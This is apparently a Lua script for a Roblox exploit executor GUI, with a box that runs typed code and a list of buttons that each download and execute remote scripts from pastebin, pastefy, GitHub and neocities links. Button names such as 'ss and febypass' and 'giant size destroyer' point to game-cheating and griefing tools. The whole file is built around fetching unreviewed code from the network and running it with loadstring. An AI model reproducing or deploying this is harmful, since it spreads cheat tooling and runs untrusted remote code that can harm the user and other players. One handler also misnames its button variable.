--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 

designed using localmaze gui creator
]=]

-- Instances: 41 | Scripts: 0 | Modules: 0 | Tags: 0
local LMG2L = {};

-- Players.giruoh_jgry.PlayerGui.ScreenGui
LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame
LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["Frame_2"]["BorderSizePixel"] = 0;
LMG2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Frame_2"]["Size"] = UDim2.new(0, 584, 0, 354);
LMG2L["Frame_2"]["Position"] = UDim2.new(0, 34, 0, 8);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.UICorner
LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["Frame_2"]);
LMG2L["UICorner_3"]["CornerRadius"] = UDim.new(0, 10);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel
LMG2L["ImageLabel_4"] = Instance.new("ImageLabel", LMG2L["Frame_2"]);
LMG2L["ImageLabel_4"]["BorderSizePixel"] = 0;
LMG2L["ImageLabel_4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- LMG2L["ImageLabel_4"]["ImageContent"] = ;
LMG2L["ImageLabel_4"]["Image"] = [[rbxassetid://108689301385143]];
LMG2L["ImageLabel_4"]["Size"] = UDim2.new(0, 584, 0, 354);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.TextButton4
LMG2L["TextButton4_5"] = Instance.new("TextButton", LMG2L["ImageLabel_4"]);
LMG2L["TextButton4_5"]["TextWrapped"] = true;
LMG2L["TextButton4_5"]["BorderSizePixel"] = 0;
LMG2L["TextButton4_5"]["TextScaled"] = true;
LMG2L["TextButton4_5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton4_5"]["BackgroundColor3"] = Color3.fromRGB(179, 179, 179);
LMG2L["TextButton4_5"]["Size"] = UDim2.new(0, 116, 0, 28);
LMG2L["TextButton4_5"]["Text"] = [[clear]];
LMG2L["TextButton4_5"]["Name"] = [[TextButton4]];
LMG2L["TextButton4_5"]["Position"] = UDim2.new(0, 126, 0, 302);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.ScrollingFrame
LMG2L["ScrollingFrame_6"] = Instance.new("ScrollingFrame", LMG2L["ImageLabel_4"]);
LMG2L["ScrollingFrame_6"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
LMG2L["ScrollingFrame_6"]["BorderSizePixel"] = 0;
LMG2L["ScrollingFrame_6"]["BackgroundColor3"] = Color3.fromRGB(128, 128, 128);
LMG2L["ScrollingFrame_6"]["Size"] = UDim2.new(0, 152, 0, 252);
LMG2L["ScrollingFrame_6"]["Position"] = UDim2.new(0, 430, 0, 78);

local parent = LMG2L["ScrollingFrame_6"]

-- function สร้างปุ่ม
local function createButton(name, text, url)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Parent = parent
    btn.BorderSizePixel = 0
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.Size = UDim2.new(0,140,0,30)
    btn.Text = text
    btn.TextWrapped = true

    btn.MouseButton1Click:Connect(function()
        local success, result = pcall(function()
            return game:HttpGet(url)
        end)

        if not success then
            warn("HttpGet failed:", url)
            return
        end

        local func, err = loadstring(result)
        if not func then
            warn("Loadstring error:", err)
            return
        end

        local ok, runtimeErr = pcall(func)
        if not ok then
            warn("Runtime error:", runtimeErr)
        end
    end)
end

-- 📦 รายการปุ่มทั้งหมด
local buttons = {
    {"TextButton9","project duck utg","https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/projetduck.lua"},
    {"TextButton15","9/11 plane","https://pastebin.com/raw/5saVhNKb"},
    {"TextButton17","chara","https://pastebin.com/raw/g8vRx0wa"},
    {"TextButton7","SEGMA V4","https://pastefy.app/a2VxTbDs/raw"},
    {"TextButton18","dominant","https://raw.githubusercontent.com/kvsna3545-pixel/Dominant_executor/refs/heads/main/Main.luau"},
    {"TextButton2","OUCH SIMSOMP","https://pastefy.app/h6fhUC6z/raw"},
    {"TextButton4","project zaga","https://pastefy.app/rMyVKrO6/raw"},
    {"TextButton24","project two bfdi","https://pastebin.com/raw/3xHHRpsV"},
    {"TextButton8","project eluaria","https://pastefy.app/TvLHaW8s/raw"},
    {"TextButton21","project stigma","https://pastefy.app/QcuBoc7w/raw"},
    {"TextButton12","1×1×1×1×1hax gui v2","https://pastefy.app/MYWHQPCX/raw?part=1x1x1x1x1_HAX%20Gui%20V2"},
    {"TextButton23","project sligma","https://pastefy.app/QcuBoc7w/raw"},
    {"TextButton16","giant size destroyer","https://pastebin.com/raw/GqfUpdX6"},
    {"TextButton20","sigma gui private","https://pastebin.com/raw/78fUTxZV"},
    {"TextButton11","poongui by redkid","https://pastefy.app/LH5mdWwm/raw"},
    {"TextButton6","project segma v2","https://pastefy.app/EUwYT4gN/raw"},
    {"TextButton10","ss and febypass","https://pastebin.com/raw/rLZTaE8s"},
    {"TextButton14","EXTERNAL 1!1!","https://pastefy.app/4GLMKcft/raw"},
    {"TextButton5","private 1×1 v7.1.0","https://pastefy.app/tsPrm5Ky/raw"},
    {"TextButton3","SUMSUNG NOTE","https://pastefy.app/dA68xt1p/raw"},
    {"TextButton19","rc7 2016","https://fromhatai.neocities.org/Private/Rc7.lua"},
    {"TextButton","1×1 max mini gui","https://pastefy.app/4U9m0vuN/raw?part=1x1x1x1x1_hax%20Gui%20mini%20edition"},
    {"TextButton13","mang0 gui","https://pastebin.com/raw/6zDKS2TV"},
    {"TextButton22","shiba old","https://pastebin.com/raw/HrE2dKSD"},
}

-- 🔁 สร้างปุ่มทั้งหมด
for _, data in ipairs(buttons) do
    createButton(unpack(data))
end

-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.ScrollingFrame.UIListLayout
LMG2L["UIListLayout_1c"] = Instance.new("UIListLayout", LMG2L["ScrollingFrame_6"]);

-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.UICorner
LMG2L["UICorner_20"] = Instance.new("UICorner", LMG2L["ImageLabel_4"]);
LMG2L["UICorner_20"]["CornerRadius"] = UDim.new(0, 10);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.TextButton2
LMG2L["TextButton2_21"] = Instance.new("TextButton", LMG2L["ImageLabel_4"]);
LMG2L["TextButton2_21"]["TextWrapped"] = true;
LMG2L["TextButton2_21"]["BorderSizePixel"] = 0;
LMG2L["TextButton2_21"]["TextScaled"] = true;
LMG2L["TextButton2_21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton2_21"]["BackgroundColor3"] = Color3.fromRGB(179, 179, 179);
LMG2L["TextButton2_21"]["Size"] = UDim2.new(0, 116, 0, 28);
LMG2L["TextButton2_21"]["Text"] = [[coming soon]];
LMG2L["TextButton2_21"]["Name"] = [[TextButton2]];
LMG2L["TextButton2_21"]["Position"] = UDim2.new(0, 124, 0, 42);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.TextButton5
LMG2L["TextButton5_22"] = Instance.new("TextButton", LMG2L["ImageLabel_4"]);
LMG2L["TextButton5_22"]["TextWrapped"] = true;
LMG2L["TextButton5_22"]["BorderSizePixel"] = 0;
LMG2L["TextButton5_22"]["TextScaled"] = true;
LMG2L["TextButton5_22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton5_22"]["BackgroundColor3"] = Color3.fromRGB(179, 179, 179);
LMG2L["TextButton5_22"]["Size"] = UDim2.new(0, 118, 0, 28);
LMG2L["TextButton5_22"]["Text"] = [[load]];
LMG2L["TextButton5_22"]["Name"] = [[TextButton5]];
LMG2L["TextButton5_22"]["Position"] = UDim2.new(0, 244, 0, 302);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.TextLabel
LMG2L["TextLabel_23"] = Instance.new("TextLabel", LMG2L["ImageLabel_4"]);
LMG2L["TextLabel_23"]["TextWrapped"] = true;
LMG2L["TextLabel_23"]["BorderSizePixel"] = 0;
LMG2L["TextLabel_23"]["TextScaled"] = true;
LMG2L["TextLabel_23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel_23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel_23"]["BackgroundTransparency"] = 1;
LMG2L["TextLabel_23"]["Size"] = UDim2.new(0, 318, 0, 30);
LMG2L["TextLabel_23"]["Text"] = [[Project Can't think of a name 🤔🤔 by 00script]];
LMG2L["TextLabel_23"]["Position"] = UDim2.new(0, 44, 0, 4);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.TextButton3
LMG2L["TextButton3_24"] = Instance.new("TextButton", LMG2L["ImageLabel_4"]);
LMG2L["TextButton3_24"]["TextWrapped"] = true;
LMG2L["TextButton3_24"]["BorderSizePixel"] = 0;
LMG2L["TextButton3_24"]["TextScaled"] = true;
LMG2L["TextButton3_24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton3_24"]["BackgroundColor3"] = Color3.fromRGB(179, 179, 179);
LMG2L["TextButton3_24"]["Size"] = UDim2.new(0, 116, 0, 28);
LMG2L["TextButton3_24"]["Text"] = [[execute]];
LMG2L["TextButton3_24"]["Name"] = [[TextButton3]];
LMG2L["TextButton3_24"]["Position"] = UDim2.new(0, 6, 0, 302);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.ScrollingFrame2
LMG2L["ScrollingFrame2_25"] = Instance.new("ScrollingFrame", LMG2L["ImageLabel_4"]);
LMG2L["ScrollingFrame2_25"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
LMG2L["ScrollingFrame2_25"]["BorderSizePixel"] = 0;
LMG2L["ScrollingFrame2_25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ScrollingFrame2_25"]["Name"] = [[ScrollingFrame2]];
LMG2L["ScrollingFrame2_25"]["VerticalScrollBarPosition"] = Enum.VerticalScrollBarPosition.Left;
LMG2L["ScrollingFrame2_25"]["Size"] = UDim2.new(0, 420, 0, 218);
LMG2L["ScrollingFrame2_25"]["Position"] = UDim2.new(0, 4, 0, 78);
LMG2L["ScrollingFrame2_25"]["BackgroundTransparency"] = 1;


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.ScrollingFrame2.TextBox
LMG2L["TextBox_26"] = Instance.new("TextBox", LMG2L["ScrollingFrame2_25"]);
LMG2L["TextBox_26"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["TextBox_26"]["BorderSizePixel"] = 0;
LMG2L["TextBox_26"]["TextSize"] = 10;
LMG2L["TextBox_26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextBox_26"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["TextBox_26"]["BackgroundColor3"] = Color3.fromRGB(77, 77, 77);
LMG2L["TextBox_26"]["RichText"] = true;
LMG2L["TextBox_26"]["MultiLine"] = true;
LMG2L["TextBox_26"]["ClearTextOnFocus"] = false;
LMG2L["TextBox_26"]["PlaceholderText"] = [[-- script by 00script --]];
LMG2L["TextBox_26"]["Size"] = UDim2.new(0, 406, 0, 780);
LMG2L["TextBox_26"]["Position"] = UDim2.new(0, 14, 0, 0);
LMG2L["TextBox_26"]["Text"] = [[]];


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.TextButton
LMG2L["TextButton_27"] = Instance.new("TextButton", LMG2L["ImageLabel_4"]);
LMG2L["TextButton_27"]["TextWrapped"] = true;
LMG2L["TextButton_27"]["BorderSizePixel"] = 0;
LMG2L["TextButton_27"]["TextScaled"] = true;
LMG2L["TextButton_27"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton_27"]["BackgroundColor3"] = Color3.fromRGB(179, 179, 179);
LMG2L["TextButton_27"]["Size"] = UDim2.new(0, 116, 0, 28);
LMG2L["TextButton_27"]["Text"] = [[home]];
LMG2L["TextButton_27"]["Position"] = UDim2.new(0, 4, 0, 42);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.ImageLabel.TextButton6
LMG2L["TextButton6_28"] = Instance.new("TextButton", LMG2L["ImageLabel_4"]);
LMG2L["TextButton6_28"]["TextWrapped"] = true;
LMG2L["TextButton6_28"]["BorderSizePixel"] = 0;
LMG2L["TextButton6_28"]["TextScaled"] = true;
LMG2L["TextButton6_28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton6_28"]["BackgroundColor3"] = Color3.fromRGB(179, 179, 179);
LMG2L["TextButton6_28"]["Size"] = UDim2.new(0, 60, 0, 28);
LMG2L["TextButton6_28"]["Text"] = [[re]];
LMG2L["TextButton6_28"]["Name"] = [[TextButton6]];
LMG2L["TextButton6_28"]["Position"] = UDim2.new(0, 364, 0, 302);


-- Players.giruoh_jgry.PlayerGui.ScreenGui.Frame.UIDragDetector
LMG2L["UIDragDetector_29"] = Instance.new("UIDragDetector", LMG2L["Frame_2"]);

-- SERVICES
local player = game:GetService("Players").LocalPlayer

-- UI
local textbox = LMG2L["TextBox_26"]
local executeBtn = LMG2L["TextButton3_24"]
local clearBtn = LMG2L["TextButton4_5"]
local loadBtn = LMG2L["TextButton5_22"]
local reBtn = LMG2L["TextButton6_28"]

-- EXECUTE FUNCTION
executeBtn.MouseButton1Click:Connect(function()
	local code = textbox.Text
	
	if code ~= "" then
		local func, err = loadstring(code)
		
		if func then
			pcall(func)
		else
			warn("Error: "..err)
		end
	end
end)

-- CLEAR FUNCTION
clearBtn.MouseButton1Click:Connect(function()
	textbox.Text = ""
end)

loadBtn.MouseButton1Click:Connect(function()
    local success, result = pcall(function()
        return game:HttpGet("https://pastebin.com/raw/7bZyYKCW", true)
    end)

    if success then
        local func, err = loadstring(result)
        if func then
            pcall(func)
        else
            warn(err)
        end
    else
        warn("HttpGet failed")
    end
end)

rebtn.MouseButton1Click:Connect(function()
if game.Players.LocalPlayer.Character then
game.Players.LocalPlayer.Character.Humanoid.Health = 0
end
end)


return LMG2L["ScreenGui_1"], require;
